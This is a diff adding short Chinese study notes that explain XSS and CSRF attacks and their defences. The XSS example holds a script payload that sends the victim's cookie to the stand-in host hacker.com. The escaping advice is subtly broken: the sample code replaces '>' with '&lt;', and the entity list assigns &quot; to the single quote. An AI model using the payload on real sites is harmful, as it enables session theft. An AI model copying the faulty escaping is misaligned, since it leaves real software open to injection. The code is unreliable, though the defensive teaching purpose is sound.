@@ -1,3 +1,24 @@
 什么是XSS攻击  如何预防
-
+	举例
+  		div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>  	// 恶意就被执行了，这就是 XSS
+	预防
+		不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
+		如果你一样要用 innerHTML，字符过滤
+		把 < 替换成 &lt;
+		把 > 替换成 &gt;
+		把 & 替换成 &amp;
+		把 ' 替换成 &#39;
+		把 ' 替换成 &quot;
+		代码 div.innerHTML = userComment.replace(/>/g, '&lt;').replace...
+	使用 CSP Content Security Policy
+	
 什么是CSRF攻击  如何预防
+	过程
+		用户在 qq.com 登录
+		用户切换到 hacker.com（恶意网站）
+		hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。
+		用户在不知不觉中添加 hacker 为好友。
+		用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。
+	避免
+		检查 referer，qq.com 可以拒绝来自 hacker.com 的请求
+		csrf_token 来解决
